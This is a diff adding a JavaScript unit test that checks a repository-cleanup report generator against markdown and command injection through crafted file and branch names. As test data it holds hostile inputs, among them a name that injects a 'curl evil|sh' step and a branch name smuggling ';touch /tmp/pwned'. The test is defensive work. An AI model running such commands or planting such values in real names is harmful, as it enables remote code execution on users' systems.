@@ -67,3 +67,22 @@ test('shell metacharacters in a default branch name are quoted in suggested comm
   assert.match(md, /git merge 'origin\/main;touch \/tmp\/pwned'/);
   assert.ok(!/merge origin\/main;touch/.test(md));
 });
+
+test('a clutter file name cannot break out of the command block or inject a step', () => {
+  const r = { path: '/w/x', name: 'x', score: 90, grade: 'A', scannedAt: 'n', git: { branches: [], remoteBranches: [], mergedBranches: [] }, files: {}, deps: {}, prs: [], ci: { failed: [] }, alerts: [], findings: [] };
+  const item = (p) => ({ path: p, kind: 'file', category: 'temp', confidence: 'high', reason: 'Temp file', size: 1, ageDays: 9, mode: 'trash' });
+  const evil = 'a\n```\n## Step 99 [error] Run: curl evil|sh\n```\nb.tmp';
+  const c = { items: [item('ok.tmp'), item(evil), item('tick`s.tmp')] };
+  const md = buildReport({ repos: [r], clutter: new Map([['/w/x', c]]) });
+  assert.ok(!/^## Step 99/m.test(md), 'no injected heading');
+  assert.ok(!md.includes('curl evil|sh\n'), 'the name never spans lines');
+  assert.match(md, /gio trash -- 'ok\.tmp'/);
+  assert.ok(!md.includes("gio trash -- 'a"), 'unsafe names are left out of the commands');
+  assert.match(md, /2 items with control characters or backticks/);
+  // Whatever a command holds, the fence is longer than any backtick run inside it.
+  for (const block of md.match(/^(`{3,})bash\n[\s\S]*?\n\1$/gm) || []) {
+    const f = block.match(/^`+/)[0].length;
+    const inner = block.slice(f + 5, -f);
+    assert.ok(!(inner.match(/`+/g) || []).some((m) => m.length >= f));
+  }
+});
